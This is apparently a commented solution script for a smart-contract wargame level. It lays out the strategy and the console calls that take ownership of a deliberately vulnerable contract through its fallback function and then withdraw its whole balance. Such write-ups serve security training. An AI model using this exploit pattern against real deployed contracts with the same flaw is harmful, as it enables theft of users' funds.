// LEVEL GOALS:
// 1. Claim ownership of contract
// 2. Reduce contract balance to 0
// -------------------------------
// STRATEGY:
// 1. Contribute less than 0.001 ether using contribute()
// 2. Call fallback function, sending it some ether.
//      Do this by hardcoding junk data in the data field
//      of a custom transaction, can't use ABI. 
// 3. If sender has positive contribution,
//      and fallback called with some ether sent,
//      will transfer ownership to sender
// 4. Call withdraw() to steal contract balance
// -------------------------------------------- 
// STEPS TO COMPLETE LEVEL
// -----------------------

// 1 - Contribute < 0.001 ether
await contract.contribute({from: player, value: toWei("0.0009"), gas: 1000000})

// 2 - Call fallback function
// data = some junk value (to call an unknown function)
// value = some positive amount of ether
// from = a sender who has contributed
// to = the contract
await sendTransaction({data: "0x999", from: player, to: instance, value: toWei("0.0001"), gas: 1000000})

// 3 - Check if I pwned the contract
await contract.owner() // I did

// 4 - Call withdraw to steal funds
await contract.withdraw({from: player, gas: 1000000})
